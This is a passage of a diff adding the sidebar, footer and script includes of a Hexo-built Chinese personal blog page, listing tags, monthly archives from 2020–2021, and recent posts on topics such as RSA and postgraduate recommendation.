href="../../../../tags/v8/" style="font-size: 10px;">v8</a> <a href="../../../../tags/%E3%80%8A%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9C%9F%E7%9B%B8%E8%BF%98%E5%8E%9F%E3%80%8B/" style="font-size: 10px;">《操作系统真相还原》</a> <a href="../../../../tags/%E4%BA%BA%E7%94%9F/" style="font-size: 10px;">人生</a> <a href="../../../../tags/%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/" style="font-size: 10px;">出题环境</a> <a href="../../../../tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 16.67px;">基础知识</a> <a href="../../../../tags/%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/" style="font-size: 10px;">基础练习</a> <a href="../../../../tags/%E5%A4%A9%E6%A2%AF%E8%B5%9B/" style="font-size: 10px;">天梯赛</a> <a href="../../../../tags/%E5%AE%89%E8%A3%85/" style="font-size: 10px;">安装</a> <a href="../../../../tags/%E6%8E%A8%E5%85%8D/" style="font-size: 10px;">推免</a> <a href="../../../../tags/%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" style="font-size: 10px;">漏洞基础</a> <a href="../../../../tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" style="font-size: 10px;">牛客网</a> <a href="../../../../tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 10px;">环境搭建</a> <a href="../../../../tags/%E8%93%9D%E6%A1%A5%E6%9D%AF/" style="font-size: 20px;">蓝桥杯</a> <a href="../../../../tags/%E8%A5%BF%E5%8D%97%E7%A7%91%E6%8A%80%E5%A4%A7%E5%AD%A6%E6%96%B0%E7%94%9F%E8%B5%9B/" style="font-size: 10px;">西南科技大学新生赛</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/10/">October 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="../../../../archives/2020/07/">July 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="../../../10/30/%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%A2%AF%E5%BA%A6%E4%B8%8B%E9%99%8D%E6%9D%A5%E4%BC%98%E5%8C%96%E4%BA%BA%E7%94%9F/">用随机梯度下降来优化人生</a>
+          </li>
+        
+          <li>
+            <a href="../../../10/14/%C2%962021%E6%8E%A8%E5%85%8D%E6%80%BB%E7%BB%93/">2021推免总结</a>
+          </li>
+        
+          <li>
+            <a href="../../../10/08/rsa%E7%AE%97%E6%B3%95/">rsa算法</a>
+          </li>
+        
+          <li>
+            <a href="../../../08/26/leetcode%E4%B9%8B%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/">leetcode之算法学习计划</a>
+          </li>
+        
+          <li>
+            <a href="../../../08/07/LearnBlockchainbyBuildingOne/">Learn Blockchain by Building One_book study</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 winter<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="../../../../index.html" class="mobile-nav-link">Home</a>
+  
+    <a href="../../../../archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="../../../../fancybox/jquery.fancybox.css">
+
+  
+<script src="../../../../fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="../../../../js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
